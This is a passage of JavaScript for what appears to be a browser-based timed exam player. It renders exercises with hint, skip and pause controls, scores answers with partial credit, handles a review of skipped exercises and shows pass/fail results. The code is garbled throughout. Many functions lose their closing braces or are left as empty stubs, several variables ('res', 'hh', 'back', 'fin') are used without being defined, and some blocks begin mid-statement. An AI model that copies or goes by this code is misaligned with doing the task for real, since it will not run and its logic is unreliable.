    hintBtn.disabled = a.hintUsed || a.status === 'checked';
    hintBtn.addEventListener('click', function () {
      if (a.hintUsed || a.status === 'checked') return;
      a.hintUsed = true; hintBtn.disabled = true;
      var hb = el('div', 'hintbox', '<div class="hb-h">💡 Hint — this exercise\'s credit is now reduced by 10%</div>' + esc(ex.hint));
      card.insertBefore(hb, actions);
    });
    var skipBtn = el('button', 'btn btn-ghost', '⚠ Skip');
    skipBtn.type = 'button'; skipBtn.setAttribute('aria-label', 'Skip this exercise'); skipBtn.disabled = a.status === 'checked';
    skipBtn.addEventListener('click', doSkip);
    actions.appendChild(checkBtn); actions.appendChild(nextBtn); actions.appendChild(el('span', 'spacer'));
    actions.appendChild(hintBtn); actions.appendChild(skipBtn);
    card.appendChild(actions);
    area.appendChild(card);

    /* manual pause veil (hidden by default) */
    if (S.timerState === 'PAUSED_MANUAL') showPauseVeil();

    /* restore feedback if already checked (should not normally happen) */
    if (a.status === 'checked') { renderFeedback(card, ex, a, true); checkBtn.disabled = true; nextBtn.classList.remove('hidden'); }

    updateScoreBar();
    /* pause button lives in topbar */
    renderTopbarButtons();
  }
  function renderTopbarButtons() {
    var bar = $('topbar');
    var old = document.getElementById('pauseBtn');
    if (old) old.remove();
    if (S.screen !== 'exam') return;
    var b = el('button', 'btn btn-ghost', '⏸ Pause');
    b.type = 'button'; b.id = 'pauseBtn'; b.setAttribute('aria-label', 'Pause the exam (manual pause)');
    b.addEventListener('click', function () {
      if (S.timerState === 'RUNNING' || S.timerState === 'PAUSED_AUTO_CHECK') {
        S.priorState = S.timerState;
        setTimerState('PAUSED_MANUAL'); showPauseVeil();
      } else if (S.timerState === 'PAUSED_MANUAL') {
        hidePauseVeil(); setTimerState(S.priorState || 'RUNNING');

    });
    bar.appendChild(b);
    var oldF = document.getElementById('finishBtn');
    if (oldF) oldF.remove();
    var f = el('button', 'btn btn-ghost', '⏹ Finish');

  }
  function showPauseVeil() {

    var veil = el('div', 'pause-veil',
      '<div class="pv-ic" aria-hidden="true">⏸</div><div class="pv-word">PAUSED — manual</div>' +
      '<div style="color:var(--text-secondary);max-width:420px">The exercise is hidden while you are on a break. The timer is stopped.</div>');
    var r = el('button', 'btn btn-primary', '▶ Resume');
    r.type = 'button'; r.setAttribute('aria-label', 'Resume the exam');
    r.addEventListener('click', function () {
      hidePauseVeil();
      setTimerState(S.priorState === 'PAUSED_AUTO_CHECK' ? 'PAUSED_AUTO_CHECK' : 'RUNNING');

    veil.appendChild(r);
    stage.appendChild(veil);
    $('exerciseArea').querySelector('.card').style.visibility = 'hidden';

  function hidePauseVeil() {

  }

  function doCheck() {
    var i = S.current, ex = EXERCISES[i], a = S.answers[i];
    if (a.status === 'checked') return;
    var res = scoreExercise(ex, a.wstate);
    a.status = 'checked';
    a.credit = res.credit;
    a.result = res;
    a.label = res.credit >= 1 ? 'correct' : (res.credit > 0 ? 'partial' : 'incorrect');
    setTimerState('PAUSED_AUTO_CHECK'); /* check-triggered auto-pause */
    var card = $('exerciseArea').querySelector('.card');
    renderFeedback(card, ex, a, false);
    var cb = document.getElementById('checkBtn'); if (cb) cb.disabled = true;
    var sb = document.querySelector('#exerciseArea .btn-ghost'); /* skip button */ if (sb) sb.disabled = true;
    var hb = document.querySelector('#exerciseArea .btn-amber'); if (hb) hb.disabled = true;
    var nb = document.getElementById('nextBtn'); if (nb) nb.classList.remove('hidden');

  function lockWidgets(card) {

  }
  function renderFeedback(card, ex, a, restoring) {

    var cls = a.label === 'correct' ? 'fb-correct' : (a.label === 'partial' ? 'fb-partial' : 'fb-incorrect');
    var word = a.label === 'correct' ? '✓ CORRECT' : (a.label === 'partial' ? '✓ PARTIALLY CORRECT' : '✗ INCORRECT');
    var fb = el('div', 'fb ' + cls);

    if (res.N > 1) hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + ' — ' + res.H + '/' + res.N + ' items</span>';
    else hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + '</span>';
    if (a.hintUsed) hh += '<span class="fb-credit">💡 hint −0.10 applied</span>';

  function doSkip() {
    var i = S.current, a = S.answers[i];
    if (a.status === 'checked') return;
    a.status = 'skipped';
    if (S.skipped.indexOf(i) < 0) S.skipped.push(i);
    /* no auto-pause: timer keeps running */
    advance();
  }
  function goNext() {
    if (S.timerState === 'PAUSED_AUTO_CHECK') setTimerState('RUNNING'); /* resume on Next */

    advance();
  }
  function advance() {
    var nxt = -1;
    for (var j = S.current + 1; j < EXERCISES.length; j++) { if (S.answers[j].status === 'unanswered') { nxt = j; break; } }
    if (nxt < 0) { /* none forward: go to review or results */
      for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered') { nxt = k; break; } }
    }
    if (nxt >= 0) renderExercise(nxt);
    else finishExam(false);
  }

  /* ---------------- review-skipped screen ---------------- */
  function renderReview() {
    var root = $('screen-review'); root.innerHTML = '';
    var c = el('div', 'card');
    c.appendChild(el('h2', null, '⚠ Review skipped exercises'));
    var open = S.skipped.filter(function (i) { return S.answers[i].status === 'skipped'; });
    if (open.length === 0) {
      c.appendChild(el('p', null, 'No skipped exercises left — everything was answered.'));
    } else {
      c.appendChild(el('p', 'dd-hint', 'You can return to any skipped exercise and answer it while the timer has not ended. Skipped-and-never-answered exercises are excluded from your score.'));
      open.forEach(function (i) {
        var row = el('div', 'rev-item');
        row.appendChild(el('span', 'ri-id', esc(EXERCISES[i].id)));
        row.appendChild(el('span', 'ri-sum', esc(EXERCISES[i].summary)));
        var b = el('button', 'btn btn-blue', '↩ Return to it');
        b.type = 'button'; b.setAttribute('aria-label', 'Return to ' + EXERCISES[i].id);
        b.addEventListener('click', function () { S.reviewMode = true; S.reviewFrom = 'review'; showScreen('exam'); renderExercise(i); });
        row.appendChild(b);
        c.appendChild(row);
      });
    }
    var acts = el('div', 'actions');

    back.type = 'button';
    back.addEventListener('click', function () {
      var u = -1; for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered' && S.skipped.indexOf(k) < 0) { u = k; break; } }
      if (u < 0) u = -1;

    acts.appendChild(back); acts.appendChild(el('span', 'spacer')); acts.appendChild(fin);
    c.appendChild(acts);
    root.appendChild(c);
  }

  /* ---------------- results ---------------- */
  function finishExam(timeout) {
    var anySkippedOpen = S.skipped.some(function (i) { return S.answers[i].status === 'skipped'; });
    if (!timeout && anySkippedOpen && S.timerState !== 'ENDED' && S.screen !== 'review') { renderReview(); showScreen('review'); return; }
    setTimerState('ENDED');
    var r = creditSum();
    var answered = r.n;
    var percent = answered > 0 ? Math.round((r.sum / answered) * 100) : 0;
    var passed = percent >= (META.passMark || 70);
    /* counts */
    var full = 0, part = 0, zero = 0, skipped = 0, partSum = 0;
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status;
      if (st === 'checked') {
        var cr = S.answers[i].credit;

    var hero = el('div', 'card');
    var verdictTxt = passed ? '✓ PASS' : '✗ FAIL';
    hero.appendChild(el('div', 'res-hero',
      '<div><div class="res-score">' + percent + '%<small> · ' + r.sum.toFixed(1) + ' / ' + answered + ' credits</small></div>' +
      '<div class="dd-hint">scored over answered exercises only — skipped and never-answered are excluded</div></div>' +
      '<div class="verdict ' + (passed ? 'pass' : 'fail') + '">' + verdictTxt + '</div>'));
    root.appendChild(hero);
    var grid = el('div', 'res-grid');
    function cell(n, l, cls, ic) { return '<div class="res-cell"><div class="rc-n ' + (cls || '') + '">' + n + '</div><div class="rc-l"><span>' + ic + '</span><span>' + l + '</span></div></div>'; }

      cell(zero, 'Fully incorrect', 'no-c', '✗') +
      cell(skipped, 'Skipped — excluded', 'mi-c', '⚠');
    var gcard = el('div', 'card'); gcard.appendChild(grid);
    gcard.appendChild(el('div', 'dd-hint', '⏸ Time paused manually: ' + fmtTime(Math.round(S.manualPauseMs / 1000)) + ' · ⏸ Time reviewing feedback (auto-pause): ' + fmtTime(Math.round(S.autoPauseMs / 1000)) + ' · ⏱ Time used: ' + fmtTime((META.estimatedMinutes * 60) - S.remaining) + (timeout ? ' (timer ran out)' : '')));
    /* per-exercise strip */
    var strip = el('div', 'strip');
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status, cr = S.answers[i].credit;
      var cls = st === 'checked' ? (cr >= 1 ? 'st-ok' : cr > 0 ? 'st-pa' : 'st-no') : 'st-sk';
      var ic = st === 'checked' ? (cr >= 1 ? '✓' : cr > 0 ? '±' : '✗') : '⚠';
      var chip = el('span', 'st-chip ' + cls, ic);
      chip.title = ex.id + (st === 'checked' ? ' — credit ' + cr.toFixed(2) : ' — skipped/excluded');
      chip.setAttribute('aria-label', chip.title);
      strip.appendChild(chip);
    });
    gcard.appendChild(strip);
    root.appendChild(gcard);
    var acts = el('div', 'actions');
    var rt = el('button', 'btn btn-primary', '↺ Retake the exam');
    rt.type = 'button'; rt.setAttribute('aria-label', 'Retake the exam');
    rt.addEventListener('click', retake);
    acts.appendChild(rt);
    root.appendChild(el('div', 'card', '')).appendChild(acts);

  }
  function retake() {

    S.skipped = []; S.current = 0; S.reviewMode = false; S.reported = false; S.attempt++;

        score: Math.round(creditSumV),
        total: answeredCount,
        percent: percent,
        passed: percent >= 70
      }, location.origin);

  }

        var c = $('tbCandidate');
        c.textContent = '👤 ' + String(event.data.username).slice(0, 24);
        c.classList.remove('hidden');
      }
      /* country, locale, topicId, batch are consumed; theme is always 'dark' — this file is dark-only by contract */
    } catch (e) { }
  });

  /* ---------------- boot ---------------- */
  function boot() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    buildShuffles();
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    renderIntro();
    showScreen('intro');
  }
  window.__CP_BOOT__ = boot;
})();
